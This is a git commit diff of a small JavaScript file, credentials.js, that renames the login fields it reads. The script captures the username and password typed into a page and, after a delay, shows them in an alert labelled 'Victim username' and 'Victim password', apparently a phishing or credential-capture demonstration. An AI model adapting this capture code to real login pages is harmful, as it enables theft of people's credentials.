fff92aa68410b68a207c715496aabe8c6e916de7
haxuanhuy <52565807+haxuanhuy@users.noreply.github.com>
2025-09-24 17:45:50 +0700

    Update credentials.js

--- credentials.js
+++ credentials.js
@@ -1,14 +1,14 @@
 let isFilled = false;
 
  function checkInputs() {
-    const input1 = document.getElementsByName('uname')[0];
-    const input2 = document.getElementsByName('password')[0];
+    const input1 = document.getElementsByName('UserName')[0];
+    const input2 = document.getElementsByName('UserPass')[0];
 
     if (input1.value && input2.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          alert('Victim username: '+document.getElementsByName('uname')[0].value+'\n\nVictim password: '+document.getElementsByName('password')[0].value);
+          alert('Victim username: '+document.getElementsByName('UserName')[0].value+'\n\nVictim password: '+document.getElementsByName('UserPass')[0].value);
          
         }, 4500); 
       }
